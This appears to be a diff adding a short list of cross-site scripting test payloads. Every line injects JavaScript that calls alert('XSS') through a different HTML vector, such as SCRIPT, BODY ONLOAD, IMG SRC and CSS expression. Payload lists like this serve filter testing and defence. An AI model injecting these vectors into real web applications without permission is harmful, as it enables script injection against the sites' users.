@@ -1,0 +1,12 @@
+<SCRIPT>alert('XSS')</SCRIPT>
+<BASE HREF="javascript:alert('XSS');//">
+<BGSOUND SRC="javascript:alert('XSS');">
+<BODY BACKGROUND="javascript:alert('XSS');">
+<BODY ONLOAD=alert('XSS')>
+<DIV STYLE="background-image:url(javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG DYNSRC="javascript:alert('XSS');">
